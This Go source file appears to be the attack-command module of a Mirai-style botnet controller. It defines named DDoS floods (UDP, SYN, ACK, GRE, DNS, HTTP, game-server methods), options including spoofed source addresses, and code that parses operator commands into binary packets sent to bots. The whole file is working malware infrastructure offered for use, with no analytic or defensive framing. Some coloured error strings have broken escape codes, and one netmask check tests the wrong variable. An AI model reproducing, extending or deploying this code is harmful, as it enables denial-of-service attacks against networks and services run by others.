package main

import (
    "fmt"
    "strings"
    "strconv"
    "net"
    "encoding/binary"
    "errors"
    "github.com/mattn/go-shellwords"
)

type AttackInfo struct {
    attackID            uint8
    attackFlags         []uint8
    attackDescription   string
}

type Attack struct {
    Duration    uint32
    Type        uint8
    Targets     map[uint32]uint8    // Prefix/netmask
    Flags       map[uint8]string    // key=value
}

type FlagInfo struct {
    flagID          uint8
    flagDescription string
}

var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo {
    "len": FlagInfo {
        0,
        "Size of packet data, default is 512 bytes",
    },
    "rand": FlagInfo {
        1,
        "Randomize packet data content, default is 1 (yes)",
    },
    "tos": FlagInfo {
        2,
        "TOS field value in IP header, default is 0",
    },
    "ident": FlagInfo {
        3,
        "ID field value in IP header, default is random",
    },
    "ttl": FlagInfo {
        4,
        "TTL field in IP header, default is 255",
    },
    "df": FlagInfo {
        5,
        "Set the Dont-Fragment bit in IP header, default is 0 (no)",
    },
    "sport": FlagInfo {
        6,
        "Source port, default is random",
    },
    "dport": FlagInfo {
        7,
        "Destination port, default is random",
    },
    "domain": FlagInfo {
        8,
        "Domain name to attack",
    },
    "dhid": FlagInfo {
        9,
        "Domain name transaction ID, default is random",
    },
    "urg": FlagInfo {
        11,
        "Set the URG bit in IP header, default is 0 (no)",
    },
    "ack": FlagInfo {
        12,
        "Set the ACK bit in IP header, default is 0 (no) except for ACK flood",
    },
    "psh": FlagInfo {
        13,
        "Set the PSH bit in IP header, default is 0 (no)",
    },
    "rst": FlagInfo {
        14,
        "Set the RST bit in IP header, default is 0 (no)",
    },
    "syn": FlagInfo {
        15,
        "Set the ACK bit in IP header, default is 0 (no) except for SYN flood",
    },
    "fin": FlagInfo {
        16,
        "Set the FIN bit in IP header, default is 0 (no)",
    },
    "seqnum": FlagInfo {
        17,
        "Sequence number value in TCP header, default is random",
    },
    "acknum": FlagInfo {
        18,
        "Ack number value in TCP header, default is random",
    },
    "gcip": FlagInfo {
        19,
        "Set internal IP to destination ip, default is 0 (no)",
    },
    "method": FlagInfo {
        20,
        "HTTP method name, default is get",
    },
    "postdata": FlagInfo {
        21,
        "POST data, default is empty/none",
    },
    "path": FlagInfo {
        22,
        "HTTP path, default is /",
    },
    /*"ssl": FlagInfo {
        23,
        "Use HTTPS/SSL"
    },
    */
    "conns": FlagInfo {
        24,
        "Number of connections",
    },
    "source": FlagInfo {
        25,
        "Source IP address, 255.255.255.255 for random",
    },
}

var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
    "udp": AttackInfo {
        0,
        []uint8 { 2, 3, 4, 0, 1, 5, 6, 7, 25 },
        "ip time dport=port",
    },
    "vse": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "ip time dport=port (game servers)",
    },
    "dns": AttackInfo {
        2,
        []uint8 { 2, 3, 4, 5, 6, 7, 8, 9 },
        "ip time dport=port",
    },
    "syn": AttackInfo {
        3,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "ip time dport=port (tcp based)",
    },
    "ack": AttackInfo {
        4,
        []uint8 { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "ip time dport=port (tcp based)",
    },
    "stomp": AttackInfo {
        5,
        []uint8 { 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 },
        "ip time dport=port (tcp based)",
    },
    "greip": AttackInfo {
        6,
        []uint8 {0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
        "ip time dport=port",
    },
    "greeth": AttackInfo {
        7,
        []uint8 {0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
        "ip time dport=port",
    },
    "udpplain": AttackInfo {
        9,
        []uint8 {0, 1, 7},
        "ip time dport=port (xtra pps)",
    },
    "http": AttackInfo {
        10,
        []uint8 {8, 7, 20, 21, 22, 24},
        "ip time domain=domain conns=5000",
    },
	
	"nfo": AttackInfo {
        11,
		[]uint8 { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        
        "ip time dport=port",
    },
}

func uint8InSlice(a uint8, list []uint8) bool {
    for _, b := range list {
        if b == a {
            return true
        }
    }
    return false
}

func NewAttack(str string, admin int) (*Attack, error) {
    atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
    args, _ := shellwords.Parse(str)

    var atkInfo AttackInfo
    // Parse attack name
    if len(args) == 0 {
        return nil, errors.New("[38;2;222;31;171mM[38;2;214;36;173mu[38;2;206;41;175ms[38;2;198;46;177mt[38;2;190;51;179m [38;2;182;56;181ms[38;2;174;61;183mp[38;2;166;66;185me[38;2;158;71;187mc[38;2;150;76;189mi[38;2;142;81;191mf[38;2;134;86;193my[38;2;126;91;195m [38;2;118;96;197ma[38;2;110;101;199mn[38;2;102;106;201m [38;2;94;111;203ma[38;2;86;116;205mt[38;2;78;121;207mt[38;2;70;126;209ma[38;2;62;131;211mc[38;2;54;136;213mk[38;2;46;141;215m [38;2;38;146;217mn[38;2;30;151;219ma[38;2;22;156;221mm[38;2;14;161;223me[0;00m")
    } else {
        if args[0] == "[38;2;222;31;171mM" {
            validCmdList := "\x1b[0;37m\r\n\x1b[0;36m"
            for cmdName, atkInfo := range attackInfoLookup {
                validCmdList += cmdName + ": " + atkInfo.attackDescription + "\r\n"
            }
            return nil, errors.New(validCmdList)
        }
        var exists bool
        atkInfo, exists = attackInfoLookup[args[0]]
        if !exists {
            return nil, errors.New(fmt.Sprintf("\033[37;1m%s \033[38;2;252;8;8mI[38;2;242;8;17ms[38;2;232;8;26m [38;2;222;8;35mN[38;2;212;8;44mo[38;2;202;8;53mt[38;2;192;8;62m [38;2;182;8;71mA[38;2;172;8;80m [38;2;162;8;89mV[38;2;152;8;98ma[38;2;142;8;107ml[38;2;132;8;116mi[38;2;122;8;125md[38;2;112;8;134m [38;2;102;8;143mC[38;2;92;8;152mo[38;2;82;8;161mm[38;2;72;8;170mm[38;2;62;8;179ma[38;2;52;8;188mn[38;2;42;8;197md[0;00m", args[0]))
        }
        atk.Type = atkInfo.attackID
        args = args[1:]
    }

    // Parse targets
    if len(args) == 0 {
        return nil, errors.New("[38;2;222;31;171mM[38;2;217;35;172mu[38;2;212;39;173ms[38;2;207;43;174mt[38;2;202;47;175m [38;2;197;51;176ms[38;2;192;55;177mp[38;2;187;59;178me[38;2;182;63;179mc[38;2;177;67;180mi[38;2;172;71;181mf[38;2;167;75;182my[38;2;162;79;183m [38;2;157;83;184mp[38;2;152;87;185mr[38;2;147;91;186me[38;2;142;95;187mf[38;2;137;99;188mi[38;2;132;103;189mx[38;2;127;107;190m/[38;2;122;111;191mn[38;2;117;115;192me[38;2;112;119;193mt[38;2;107;123;194mm[38;2;102;127;195ma[38;2;97;131;196ms[38;2;92;135;197mk[38;2;87;139;198m [38;2;82;143;199ma[38;2;77;147;200ms[38;2;72;151;201m [38;2;67;155;202mt[38;2;62;159;203ma[38;2;57;163;204mr[38;2;52;167;205mg[38;2;47;171;206me[38;2;42;175;207mt[38;2;37;179;208ms[0;00m")
    } else {
        if args[0] == "?" {
            return nil, errors.New("\033[37;1mComma delimited list of target prefixes\r\nEx: 192.168.0.1\r\nEx: 10.0.0.0/8\r\nEx: 8.8.8.8,127.0.0.0/29")
        }
        cidrArgs := strings.Split(args[0], ",")
        if len(cidrArgs) > 255 {
            return nil, errors.New("Cannot specify more than 255 targets in a single attack!")
        }
        for _,cidr := range cidrArgs {
            prefix := ""
            netmask := uint8(32)
            cidrInfo := strings.Split(cidr, "/")
            if len(cidrInfo) == 0 {
                return nil, errors.New("[38;2;222;31;171mB[38;2;213;37;174ml[38;2;204;43;177ma[38;2;195;49;180mn[38;2;186;55;183mk[38;2;177;61;186m [38;2;168;67;189mt[38;2;159;73;192ma[38;2;150;79;195mr[38;2;141;85;198mg[38;2;132;91;201me[38;2;123;97;204mt[38;2;114;103;207m [38;2;105;109;210ms[38;2;96;115;213mp[38;2;87;121;216me[38;2;78;127;219mc[38;2;69;133;222mi[38;2;60;139;225mf[38;2;51;145;228mi[38;2;42;151;231me[38;2;33;157;234md[38;2;24;163;237m![0;00m")
            }
            prefix = cidrInfo[0]
            if len(cidrInfo) == 2 {
                netmaskTmp, err := strconv.Atoi(cidrInfo[1])
                if err != nil || netmask > 32 || netmask < 0 {
                    return nil, errors.New(fmt.Sprintf("Invalid netmask was supplied, near %s", cidr))
                }
                netmask = uint8(netmaskTmp)
            } else if len(cidrInfo) > 2 {
                return nil, errors.New(fmt.Sprintf("Too many /'s in prefix, near %s", cidr))
            }

            ip := net.ParseIP(prefix)
            if ip == nil {
                return nil, errors.New(fmt.Sprintf("Failed to parse IP address, near %s", cidr))
            }
            atk.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
        }
        args = args[1:]
    }

    // Parse attack duration time
    if len(args) == 0 {
        return nil, errors.New("[38;2;222;31;171mM[38;2;215;36;173mu[38;2;208;41;175ms[38;2;201;46;177mt[38;2;194;51;179m [38;2;187;56;181ms[38;2;180;61;183mp[38;2;173;66;185me[38;2;166;71;187mc[38;2;159;76;189mi[38;2;152;81;191mf[38;2;145;86;193my[38;2;138;91;195m [38;2;131;96;197ma[38;2;124;101;199mn[38;2;117;106;201m [38;2;110;111;203ma[38;2;103;116;205mt[38;2;96;121;207mt[38;2;89;126;209ma[38;2;82;131;211mc[38;2;75;136;213mk[38;2;68;141;215m [38;2;61;146;217md[38;2;54;151;219mu[38;2;47;156;221mr[38;2;40;161;223ma[38;2;33;166;225mt[38;2;26;171;227mi[38;2;19;176;229mo[38;2;12;181;231mn[0;00m")
    } else {
        if args[0] == "?" {
            return nil, errors.New("\033[37;1mDuration of the attack, in seconds")
        }
        duration, err := strconv.Atoi(args[0])
        if err != nil || duration == 0 || duration > 10800 {
            return nil, errors.New(fmt.Sprintf("Invalid attack duration, near %s. Duration must be between 0 and 10800 seconds", args[0]))
        }
        atk.Duration = uint32(duration)
        args = args[1:]
    }

    // Parse flags
    for len(args) > 0 {
        if args[0] == "?" {
            validFlags := "\033[37;1mList of flags key=val seperated by spaces. Valid flags for this method are\r\n\r\n"
            for _, flagID := range atkInfo.attackFlags {
                for flagName, flagInfo := range flagInfoLookup {
                    if flagID == flagInfo.flagID {
                        validFlags += flagName + ": " + flagInfo.flagDescription + "\r\n"
                        break
                    }
                }
            }
            validFlags += "\r\nValue of 65535 for a flag denotes random (for ports, etc)\r\n"
            validFlags += "Ex: seq=0\r\nEx: sport=0 dport=65535"
            return nil, errors.New(validFlags)
        }
        flagSplit := strings.SplitN(args[0], "=", 2)
        if len(flagSplit) != 2 {
            return nil, errors.New(fmt.Sprintf("Invalid key=value flag combination near %s", args[0]))
        }
        flagInfo, exists := flagInfoLookup[flagSplit[0]]
        if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) || (admin == 0 && flagInfo.flagID == 25) {
            return nil, errors.New(fmt.Sprintf("Invalid flag key %s, near %s", flagSplit[0], args[0]))
        }
        if flagSplit[1][0] == '"' {
            flagSplit[1] = flagSplit[1][1:len(flagSplit[1]) - 1]
            fmt.Println(flagSplit[1])
        }
        if flagSplit[1] == "true" {
            flagSplit[1] = "1"
        } else if flagSplit[1] == "false" {
            flagSplit[1] = "0"
        }
        atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]
        args = args[1:]
    }
    if len(atk.Flags) > 255 {
        return nil, errors.New("Cannot have more than 255 flags")
    }

    return atk, nil
}

func (this *Attack) Build() ([]byte, error) {
    buf := make([]byte, 0)
    var tmp []byte

    // Add in attack duration
    tmp = make([]byte, 4)
    binary.BigEndian.PutUint32(tmp, this.Duration)
    buf = append(buf, tmp...)

    // Add in attack type
    buf = append(buf, byte(this.Type))

    // Send number of targets
    buf = append(buf, byte(len(this.Targets)))

    // Send targets
    for prefix,netmask := range this.Targets {
        tmp = make([]byte, 5)
        binary.BigEndian.PutUint32(tmp, prefix)
        tmp[4] = byte(netmask)
        buf = append(buf, tmp...)
    }

    // Send number of flags
    buf = append(buf, byte(len(this.Flags)))

    // Send flags
    for key,val := range this.Flags {
        tmp = make([]byte, 2)
        tmp[0] = key
        strbuf := []byte(val)
        if len(strbuf) > 255 {
            return nil, errors.New("Flag value cannot be more than 255 bytes!")
        }
        tmp[1] = uint8(len(strbuf))
        tmp = append(tmp, strbuf...)
        buf = append(buf, tmp...)
    }

    // Specify the total length
    if len(buf) > 4096 {
        return nil, errors.New("Max buffer is 4096")
    }
    tmp = make([]byte, 2)
    binary.BigEndian.PutUint16(tmp, uint16(len(buf) + 2))
    buf = append(tmp, buf...)

    return buf, nil
}
